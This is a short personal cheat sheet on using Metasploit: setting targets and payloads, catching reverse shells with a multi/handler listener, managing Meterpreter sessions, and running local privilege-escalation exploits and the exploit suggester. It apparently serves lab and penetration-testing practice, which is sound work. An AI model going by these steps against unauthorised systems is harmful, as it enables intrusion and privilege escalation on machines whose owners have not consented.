# Metasploit

This page is just basic stuff I forget all the time. There are other Metasploit tips in sections where it's relevant.

## Advanced options

Metasploit is so derp-easy that you can often exploit a machine by setting the remote IP in `RHOST` and hitting the pew-pew button. 

But sometimes that doesn't work and you cry because you know you're just a lame script kiddie pretending to be a hacker. However, you can aspire to be a _decent_ script kiddie by knowing how to use more advanced options in Metasploit.

Sometimes an exploit doesn't work because of an unusual configuration or path issue, which you can set with either `show options` or  `show advanced`. The `advanced` section may let you set`verbose = true` to provide more information about why an exploit isn't working.

You might also need to set the correct target:

```text
show targets
set target [target number]
```

[MSO8-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi) sometimes needs this because the module can't always identify the exact operating system version and language pack.

You should also pay attention to the default payload. Occasionally, you'll run into something weird like an Apache web server running on Windows, so the default Unix payload won't work. Check and modify the payload:

```text
show payloads
set payload [whatever]
```

## Meterpreter

To catch shells using meterpreter:

```text
use exploit/multi/handler
set LHOST [attack machine]
set LPORT 443
run
```

If you're VPNed into a lab, pay attention to the IP address. I've noticed that the first time this module runs, it defaults to `eth0` and you have to restart it to use something like `tap0`.

### Sessions

Meterpreter is nice because it lets you maintain multiple shell sessions and use local exploits against them. For example, the [Rejetto exploit](https://www.exploit-db.com/exploits/39161/) always seems to fire a few times and with meterpreter, you can catch every shell session with a single listener.

To list active sessions:

```text
sessions -l
```

To enter a session:

```text
sessions -i [session number]
```

To enter a shell from a session \(not use meterpreter commands\):

```text
shell
```

To exit the shell and return to meterpreter, type `exit`.

### Local exploits

Once you have a meterpreter shell, you can scan for local exploits and run them.

To access local exploits, you'll need to jump out of meterpreter using `background` and select one with the `use` command:

```text
meterpreter > background
use /exploit/windows/whatever
show options
[edit options as needed]
set SESSION [session number]
run
```

You'll need to select a session where the exploit will be run.

The one useful exception I've noticed is the exploit suggester for Windows which can be run from the meterpreter prompt:

```text
meterpreter > run /post/multi/recon/local_exploit_suggester
```
